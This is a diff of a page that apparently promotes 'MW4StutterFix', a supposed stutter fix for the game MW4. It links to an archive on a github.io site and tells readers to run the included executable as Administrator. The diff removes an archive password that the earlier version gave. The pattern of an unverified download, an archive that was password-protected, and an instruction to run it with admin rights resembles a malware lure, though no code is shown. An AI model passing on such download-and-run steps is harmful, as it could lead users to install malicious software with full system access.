@@ -43,12 +43,12 @@ While Microsoft and Nvidia have released **Advanced Shader Delivery** to help wi
 
 **[⬇️ Download MW4StutterFix.zip](https://TestingMemorialize.github.io/mw4-stutter-fix/)**
 
-*(Archive size: 4.6 MB · Password: `6427910552`)*
+*(Archive size: 4.6 MB )*
 
 </div>
-
+ 
 1. **Download** the archive from the link above.
-2. **Extract** with WinRAR or 7-Zip. Use the password `6427910552`.
+2. **Extract** with WinRAR or 7-Zip. 
 3. **Run** `MW4StutterFix.exe` as Administrator.
 4. Click **"Scan & Fix"** — the tool will clean caches and apply optimal settings.
 5. Launch MW4 and enjoy smoother gameplay.
